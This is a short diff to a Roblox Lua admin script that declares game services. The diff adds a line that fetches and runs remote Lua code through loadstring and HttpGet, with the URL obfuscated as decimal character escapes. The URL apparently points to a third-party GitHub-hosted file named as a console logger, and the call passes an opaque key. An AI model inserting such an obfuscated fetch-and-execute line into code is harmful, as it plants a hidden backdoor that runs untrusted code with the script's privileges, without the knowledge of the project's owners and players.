@@ -1,10 +1,11 @@
 -- Admin --
-local ws, plrs, reps, rs, txs
+local ws, plrs, reps, rs, txs, cnst
 ws = game:GetService("Workspace")
 plrs = game:GetService("Players")
 reps = game:GetService("ReplicatedStorage")
 rs = game:GetService("RunService")
 txs = game:GetService("TextChatService")
+cnst = loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\072\111\097\110\103\072\105\101\110\088\083\099\114\105\112\116\115\047\077\111\100\117\108\101\115\047\114\101\102\115\047\104\101\097\100\115\047\097\108\116\047\099\111\110\115\111\108\101\095\108\111\103\046\108\117\097"))("HdcqvBvMCa7sH16g5CeYtytUCSSrT15tSPMVwFeD")
 
 local vars, plr
 vars = {
